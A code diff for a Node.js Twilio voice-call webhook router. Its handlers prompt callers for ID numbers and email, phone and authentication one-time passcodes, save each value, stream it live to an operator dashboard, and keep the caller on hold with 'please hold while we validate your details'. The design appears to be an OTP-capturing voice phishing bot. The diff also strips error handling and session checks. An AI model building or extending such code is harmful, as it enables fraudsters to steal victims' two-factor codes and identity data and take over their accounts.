@@ -206,38 +206,24 @@ router.post('/collect-id/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('ID Collected:', Digits, 'Session:', sessionId);
+    console.log('ID Collected:', Digits);
     
     if (Digits) {
-        try {
-            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-            
-            if (session.rows.length === 0) {
-                twiml.say('Session not found. Goodbye.');
-                twiml.hangup();
-                return res.type('text/xml').send(twiml.toString());
-            }
-            
-            const contactId = session.rows[0].contact_id;
-            
-            await db.query(`UPDATE contacts SET id_number = $1 WHERE id = $2`, [Digits, contactId]);
-            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'id_number', Digits]);
-            
-            io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
-            
-            await db.query(`UPDATE call_sessions SET current_action = 'playing_music', last_data_type = 'id_number', last_data_value = $1 WHERE id = $2`, [Digits, sessionId]);
-            
-            twiml.say('Thank you. Please hold while we validate your details.');
-            twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
-                action: `/webhooks/leave-queue/${sessionId}`,
-                method: 'POST'
-            });
-            
-        } catch (error) {
-            console.error('Database error in collect-id:', error);
-            twiml.say('An error occurred. Goodbye.');
-            twiml.hangup();
-        }
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        const contactId = session.rows[0].contact_id;
+        
+        await db.query(`UPDATE contacts SET id_number = $1 WHERE id = $2`, [Digits, contactId]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'id_number', Digits]);
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
     } else {
         twiml.say('No ID received. Goodbye.');
         twiml.hangup();
@@ -253,38 +239,24 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Email OTP Collected:', Digits, 'Session:', sessionId);
+    console.log('Email OTP Collected:', Digits);
     
     if (Digits) {
-        try {
-            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-            
-            if (session.rows.length === 0) {
-                twiml.say('Session not found. Goodbye.');
-                twiml.hangup();
-                return res.type('text/xml').send(twiml.toString());
-            }
-            
-            const contactId = session.rows[0].contact_id;
-            
-            await db.query(`UPDATE contacts SET email_otp = $1 WHERE id = $2`, [Digits, contactId]);
-            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'email_otp', Digits]);
-            
-            io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
-            
-            await db.query(`UPDATE call_sessions SET current_action = 'playing_music', last_data_type = 'email_otp', last_data_value = $1 WHERE id = $2`, [Digits, sessionId]);
-            
-            twiml.say('Thank you. Please hold while we validate your details.');
-            twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
-                action: `/webhooks/leave-queue/${sessionId}`,
-                method: 'POST'
-            });
-            
-        } catch (error) {
-            console.error('Database error in collect-email-otp:', error);
-            twiml.say('An error occurred. Goodbye.');
-            twiml.hangup();
-        }
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        const contactId = session.rows[0].contact_id;
+        
+        await db.query(`UPDATE contacts SET email_otp = $1 WHERE id = $2`, [Digits, contactId]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'email_otp', Digits]);
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -300,38 +272,24 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Auth OTP Collected:', Digits, 'Session:', sessionId);
+    console.log('Auth OTP Collected:', Digits);
     
     if (Digits) {
-        try {
-            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-            
-            if (session.rows.length === 0) {
-                twiml.say('Session not found. Goodbye.');
-                twiml.hangup();
-                return res.type('text/xml').send(twiml.toString());
-            }
-            
-            const contactId = session.rows[0].contact_id;
-            
-            await db.query(`UPDATE contacts SET auth_otp = $1 WHERE id = $2`, [Digits, contactId]);
-            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'auth_otp', Digits]);
-            
-            io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
-            
-            await db.query(`UPDATE call_sessions SET current_action = 'playing_music', last_data_type = 'auth_otp', last_data_value = $1 WHERE id = $2`, [Digits, sessionId]);
-            
-            twiml.say('Thank you. Please hold while we validate your details.');
-            twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
-                action: `/webhooks/leave-queue/${sessionId}`,
-                method: 'POST'
-            });
-            
-        } catch (error) {
-            console.error('Database error in collect-auth-otp:', error);
-            twiml.say('An error occurred. Goodbye.');
-            twiml.hangup();
-        }
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        const contactId = session.rows[0].contact_id;
+        
+        await db.query(`UPDATE contacts SET auth_otp = $1 WHERE id = $2`, [Digits, contactId]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'auth_otp', Digits]);
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
     } else {
         twiml.say('No code received. Goodbye.');
         twiml.hangup();
@@ -347,38 +305,24 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Phone OTP Collected:', Digits, 'Session:', sessionId);
+    console.log('Phone OTP Collected:', Digits);
     
     if (Digits) {
-        try {
-            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-            
-            if (session.rows.length === 0) {
-                twiml.say('Session not found. Goodbye.');
-                twiml.hangup();
-                return res.type('text/xml').send(twiml.toString());
-            }
-            
-            const contactId = session.rows[0].contact_id;
-            
-            await db.query(`UPDATE contacts SET phone_otp = $1 WHERE id = $2`, [Digits, contactId]);
-            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'phone_otp', Digits]);
-            
-            io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
-            
-            await db.query(`UPDATE call_sessions SET current_action = 'playing_music', last_data_type = 'phone_otp', last_data_value = $1 WHERE id = $2`, [Digits, sessionId]);
-            
-            twiml.say('Thank you. Please hold while we validate your details.');
-            twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
-                action: `/webhooks/leave-queue/${sessionId}`,
-                method: 'POST'
-            });
-            
-        } catch (error) {
-            console.error('Database error in collect-phone-otp:', error);
-            twiml.say('An error occurred. Goodbye.');
-            twiml.hangup();
-        }
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        const contactId = session.rows[0].contact_id;
+        
+        await db.query(`UPDATE contacts SET phone_otp = $1 WHERE id = $2`, [Digits, contactId]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'phone_otp', Digits]);
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -394,22 +338,23 @@ router.post('/collect-custom/:sessionId', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
-    console.log('Custom data collected:', Digits, 'Session:', sessionId);
+    console.log('Custom data collected:', Digits);
     
     if (Digits) {
-        try {
-            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-            const contactId = session.rows[0].contact_id;
-            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'custom', Digits]);
-            io.emit('data_collected', { session_id: sessionId, type: 'custom', value: Digits });
-            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-            twiml.say('Thank you. Please hold while we validate your details.');
-            twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', { action: `/webhooks/leave-queue/${sessionId}`, method: 'POST' });
-        } catch (error) {
-            console.error('Database error in collect-custom:', error);
-            twiml.say('An error occurred. Goodbye.');
-            twiml.hangup();
-        }
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        const contactId = session.rows[0].contact_id;
+        
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'custom', Digits]);
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'custom', value: Digits });
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
     } else {
         twiml.say('No input received. Goodbye.');
         twiml.hangup();
@@ -423,8 +368,6 @@ router.post('/call-status/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { CallStatus, Duration } = req.body;
     const io = req.app.get('io');
-    
-    console.log('Call Status:', CallStatus, 'Session:', sessionId);
     
     if (sessionId) {
         await db.query(
